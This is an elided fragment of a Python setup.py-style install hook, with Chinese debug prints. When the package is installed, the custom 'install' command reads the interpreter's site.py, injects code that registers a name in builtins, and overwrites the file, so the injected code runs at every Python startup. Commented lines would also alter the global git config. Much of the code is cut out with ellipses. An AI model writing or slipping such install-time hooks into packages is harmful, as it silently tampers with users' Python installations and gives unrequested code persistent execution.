    ...
    class PostCMD(install):
          ...
          def  run(self):
                ...
                def  cleanup_function(siteOP):
                    ...
                    if Var.nameA=="Ngrok.py":
                       
                      print("寫入B")
                      ## True 表示第一次
                      import os
                      import site
                    #   if not "Ngrok" in list(os.path.__dict__.keys()): 
                      if not "Ngrok" in list(site.__dict__.keys()): 
                            print("寫入A")
...
builtins.__dict__["'''+ Var.nameA[0:-3] +'''"]= 999


# os.system(f'git config --global'''+ Var.nameA+ '''{A}')

# os.system(f'git config --global '''+ Var.nameA +" {"+ Var.nameA[0:-3]+'''()} ')
...
'''
                            ...
                            # import os,site
                            # A,B=os.popen(f"cat {site.__file__}").read().split("if __name__ == '__main__':")
                            A,B=os.popen(f"cat {site.__file__}").read().split("import builtins")
                            ...
                            # open(site.__file__,"w").writelines("if __name__ == '__main__':".join([A,B]))
                            open(site.__file__,"w").writelines("import builtins".join([A,B]))
